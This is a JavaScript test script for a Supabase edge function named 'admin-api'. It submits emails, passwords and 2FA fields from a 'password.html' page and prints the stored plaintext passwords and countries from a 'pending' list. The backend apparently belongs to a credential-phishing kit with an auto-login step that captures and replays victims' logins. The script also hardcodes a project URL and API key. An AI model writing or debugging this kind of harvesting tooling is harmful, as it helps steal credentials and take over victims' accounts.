// SIMPLE TEST: Does data get inserted despite 500 error?

const SUPABASE_URL = 'https://otbswtklpidhezziotac.supabase.co';
const ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im90YnN3dGtscGlkaGV6emlvdGFjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTEwOTIyNTEsImV4cCI6MjA2NjY2ODI1MX0.cxOLFAy1UlAwu_Ho_B9hA1PMfvc7Wg3DnIwrRUalzck';

const headers = {
    'Content-Type': 'application/json',
    'Authorization': `Bearer ${ANON_KEY}`,
    'apikey': ANON_KEY
};

async function testDataInsertion() {
    console.log('🧪 TESTING: Does edge function insert data despite 500 error?\n');
    
    // Step 1: Check current requests count
    console.log('📊 Step 1: Check current database state...');
    try {
        const pendingResponse = await fetch(`${SUPABASE_URL}/functions/v1/admin-api/api/pending`, {
            headers: headers
        });
        const currentRequests = await pendingResponse.json();
        console.log(`✅ Current requests in database: ${currentRequests.length}`);
        
        // Step 2: Submit a test request (expect 500 but hope data gets inserted)
        console.log('\n🚀 Step 2: Submit test request (may get 500 error)...');
        const testEmail = `test-${Date.now()}@example.com`;
        
        const submitResponse = await fetch(`${SUPABASE_URL}/functions/v1/admin-api/api/request`, {
            method: 'POST',
            headers: headers,
            body: JSON.stringify({
                email: testEmail,
                password: 'testpass123',
                twofa: '',
                userAgent: 'Test Browser - Simple Insert Test',
                currentPage: 'password.html'
            })
        });
        
        console.log(`📡 Submit response status: ${submitResponse.status}`);
        
        if (submitResponse.status === 200) {
            const data = await submitResponse.json();
            console.log(`✅ SUCCESS! Request ID: ${data.requestId}`);
        } else {
            console.log(`⚠️ Got ${submitResponse.status} error (expected due to auto-login issue)`);
            try {
                const errorData = await submitResponse.json();
                console.log('📋 Error details:', errorData.message || errorData.error);
            } catch (e) {
                console.log('📋 Could not parse error response');
            }
        }
        
        // Step 3: Wait a moment then check if data was inserted
        console.log('\n⏳ Step 3: Waiting 2 seconds then checking database...');
        await new Promise(resolve => setTimeout(resolve, 2000));
        
        const newPendingResponse = await fetch(`${SUPABASE_URL}/functions/v1/admin-api/api/pending`, {
            headers: headers
        });
        const newRequests = await newPendingResponse.json();
        console.log(`📊 Requests after submit: ${newRequests.length}`);
        
        // Step 4: Analysis
        console.log('\n📈 ANALYSIS:');
        if (newRequests.length > currentRequests.length) {
            console.log('🎉 SUCCESS! Data was inserted despite 500 error!');
            console.log('📧 Latest request email:', newRequests[0].email);
            console.log('🔐 Latest request password:', newRequests[0].password);
            console.log('📱 Latest request status:', newRequests[0].status);
            console.log('🌍 Latest request country:', newRequests[0].country);
            
            return {
                dataInserted: true,
                requestId: newRequests[0].id,
                latestRequest: newRequests[0]
            };
        } else {
            console.log('❌ PROBLEM: No new data was inserted');
            console.log('💡 This means the edge function fails before database insertion');
            
            return {
                dataInserted: false,
                requestId: null,
                latestRequest: null
            };
        }
        
    } catch (error) {
        console.error('❌ Test failed with error:', error.message);
        return {
            dataInserted: false,
            error: error.message
        };
    }
}

// Run the test
testDataInsertion().then(result => {
    console.log('\n' + '='.repeat(50));
    console.log('🏆 FINAL RESULT:');
    if (result.dataInserted) {
        console.log('✅ Edge function CAN insert data (just returns wrong status)');
        console.log('💡 Solution: Frontend should ignore 500 errors and check pending status');
        console.log('🔧 Or: Deploy fixed edge function to remove auto-login dependency');
    } else {
        console.log('❌ Edge function CANNOT insert data');
        console.log('🔧 Must deploy fixed edge function to fix the issue');
    }
}).catch(console.error); 